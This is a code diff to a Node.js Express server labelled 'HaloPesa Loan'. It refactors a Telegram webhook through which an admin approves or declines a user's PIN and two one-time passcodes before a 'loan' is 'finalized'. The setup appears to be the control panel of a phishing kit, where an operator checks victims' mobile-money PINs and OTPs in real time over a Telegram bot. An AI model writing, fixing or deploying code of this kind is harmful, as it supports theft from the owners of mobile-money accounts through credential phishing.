@@ -109,110 +109,44 @@ app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
 
-// Telegram Webhook Route for Render Production
-app.post('/telegram-webhook', async (req, res) => {
-    res.sendStatus(200); // Acknowledge Telegram instantly
+//4. Telegram Webhook (Prevents button spinner hanging & controls approval states)
+app.post('/webhook', async (req, res) => {
+    // Immediately send HTTP 200 so Telegram doesn't time out
+    res.sendStatus(200);
 
     try {
         const update = req.body;
-        if (update.callback_query) {
+
+        if (update && update.callback_query) {
             const action = update.callback_query.data;
-            const chatId = update.callback_query.message.chat.id;
-            const messageId = update.callback_query.message.message_id;
             const callbackQueryId = update.callback_query.id;
 
-            await answerCallback(callbackQueryId, 'Processing action...');
-            await removeMessageButtons(chatId, messageId);
+            console.log(`🔔 Webhook Callback Received: ${action}`);
 
-            let statusMessage = '';
-            if (action === 'approve_pin') {
-                pinStatus = 'approved';
-                statusMessage = '✅ *Status: PIN Approved by Admin*';
-            } else if (action === 'reject_pin') {
-                pinStatus = 'rejected';
-                statusMessage = '❌ *Status: PIN Declined by Admin*';
-            } else if (action === 'correct_otp1') {
-                otp1Status = 'success';
-                statusMessage = '✅ *Status: OTP 1 Approved by Admin*';
-            } else if (action === 'wrong_otp1') {
-                otp1Status = 'wrong';
-                statusMessage = '❌ *Status: OTP 1 Declined by Admin*';
-            } else if (action === 'correct_otp2') {
-                otp2Status = 'success';
-                statusMessage = '✅ *Status: OTP 2 Approved - Loan Finalized!*';
-            } else if (action === 'wrong_otp2') {
-                otp2Status = 'wrong';
-                statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
+            if (action.startsWith("approve") || action.startsWith("correct_otp")) {
+                latestStatus = "approved";
+            } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
+                latestStatus = "wrong_otp";
             }
 
-            if (statusMessage) {
-                await sendStatusMessage(chatId, statusMessage);
+            // Clear the Telegram button loading spinner on your mobile app
+            if (BOT_TOKEN) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: callbackQueryId,
+                        text: "Ação registada com sucesso!"
+                    })
+                });
             }
         }
     } catch (err) {
-        console.error('Webhook processing error:', err.message);
+        console.error("Webhook Internal Handler Error:", err.message);
     }
 });
 
-async function answerCallback(callbackQueryId, text) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ callback_query_id: callbackQueryId, text })
-        });
-    } catch (e) {
-        console.error('Answer callback error:', e);
-    }
-}
-
-async function sendTelegramMessage(text, keyboard) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: keyboard }
-        })
-    });
-}
-
-async function removeMessageButtons(chatId, messageId) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: chatId, 
-                message_id: messageId, 
-                reply_markup: { inline_keyboard: [] } 
-            })
-        });
-    } catch (e) {
-        console.error('Remove buttons error:', e);
-    }
-}
-
-async function sendStatusMessage(chatId, text) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: chatId, 
-                text: text, 
-                parse_mode: 'Markdown' 
-            })
-        });
-    } catch (e) {
-        console.error('Send status message error:', e);
-    }
-}
-
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`HaloPesa Loan server running successfully on port ${PORT}`);
-    // pollTelegramUpdates() removed because Render uses webhooks!
+    console.log(`Server is running and listening on port ${PORT}`);
 });
